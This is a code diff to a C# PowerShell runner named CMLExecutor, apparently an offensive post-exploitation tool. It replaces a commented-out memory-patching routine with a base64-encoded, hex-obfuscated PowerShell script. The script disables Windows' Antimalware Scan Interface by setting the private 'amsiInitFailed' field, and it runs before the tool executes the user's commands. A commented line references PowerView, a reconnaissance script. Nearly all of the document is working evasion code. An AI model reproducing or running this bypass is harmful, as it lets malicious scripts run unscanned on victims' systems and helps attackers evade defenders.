@@ -5,6 +5,7 @@ using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Collections.Generic;
 using System.Linq;
+using System.Text;
 using Mono.Options;
 using System.IO;
 
@@ -22,7 +23,7 @@ namespace CMLExecutor
 
         [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
+        /*
         static int Fhtagn()
         {
             IntPtr Address = GetProcAddress(LoadLibrary(string.Join("", new char[]{
@@ -60,6 +61,8 @@ namespace CMLExecutor
             VirtualProtect(Address, size, p, out _);
             return 0;
         }
+        */
+
         static void Main(string[] args)
         {
             bool show_help = false;
@@ -105,18 +108,43 @@ namespace CMLExecutor
 
             Runspace run = RunspaceFactory.CreateRunspace();
             run.Open();
-
+            /*
             Console.WriteLine(Fhtagn());
-
+            */
             PowerShell shell = PowerShell.Create();
             shell.Runspace = run;
 
             /*shell.AddCommand("Import-Module").AddArgument(@"C:\Program Files\PowerView.ps1");
             shell.Invoke();*/
+            
+            var encoded = "W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi4nKyQoIjQxIDZEIDczIDY5IDU1IDc0IDY5IDZDIDczIi5TcGxpdCgiICIpfGZvckVhY2h7W2NoYXJdKFtjb252ZXJ0XTo6dG9pbnQxNigkXywxNikpfXxmb3JFYWNoeyRyZXN1bHQ9JHJlc3VsdCskX307JHJlc3VsdCkpLkdldEZpZWxkKCQoIjYxIDZEIDczIDY5IDQ5IDZFIDY5IDc0IDQ2IDYxIDY5IDZDIDY1IDY0Ii5TcGxpdCgiICIpfGZvckVhY2h7W2NoYXJdKFtjb252ZXJ0XTo6dG9pbnQxNigkXywxNikpfXxmb3JFYWNoeyRyZXN1bHQyPSRyZXN1bHQyKyRffTskcmVzdWx0MiksJ05vblB1YmxpYyxTdGF0aWMnKS5TZXRWYWx1ZSgkbnVsbCwkdHJ1ZSk=";
+            byte[] data = Convert.FromBase64String(encoded);
+            string bypsCmd = Encoding.UTF8.GetString(data);
 
+            try
+            {
+                shell.AddScript(bypsCmd);
+                Collection<PSObject> output1 = shell.Invoke();
+                foreach (PSObject o in output1)
+                {
+                    Console.WriteLine(o.ToString());
+                }
+
+                foreach (ErrorRecord err in shell.Streams.Error)
+                {
+                    Console.Write("Error: " + err.ToString());
+                }
+                shell.Commands.Clear();
+                shell.Streams.Error.Clear();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.StackTrace);
+            }
+
+            
             if (cmd != null)
             {
-
                 var command = cmd;
                 if (cmd.StartsWith("file:"))
                 {
@@ -126,17 +154,19 @@ namespace CMLExecutor
                 try
                 {
                     shell.AddScript(command);
-                    Collection<PSObject> output = shell.Invoke();
+                    Collection<PSObject> output2 = shell.Invoke();
                     Console.WriteLine("Command Output ----- ");
-                    foreach (PSObject o in output)
+                    foreach (PSObject p in output2)
                     {
-                        Console.WriteLine(o.ToString());
+                        Console.WriteLine(p.ToString());
                     }
 
                     foreach (ErrorRecord err in shell.Streams.Error)
                     {
                         Console.Write("Error: " + err.ToString());
                     }
+                    shell.Commands.Clear();
+                    shell.Streams.Error.Clear();
                 }
                 catch (Exception e)
                 {
@@ -160,17 +190,19 @@ namespace CMLExecutor
                         try
                         {
                             shell.AddScript(command);
-                            Collection<PSObject> output = shell.Invoke();
+                            Collection<PSObject> output3 = shell.Invoke();
                             Console.WriteLine("Command Output ----- ");
-                            foreach (PSObject o in output)
+                            foreach (PSObject q in output3)
                             {
-                                Console.WriteLine(o.ToString());
+                                Console.WriteLine(q.ToString());
                             }
 
                             foreach (ErrorRecord err in shell.Streams.Error)
                             {
                                 Console.Write("Error: " + err.ToString());
                             }
+                            shell.Commands.Clear();
+                            shell.Streams.Error.Clear();
                             Console.WriteLine("Enter New Command: ");
                         }
                         catch (Exception e)
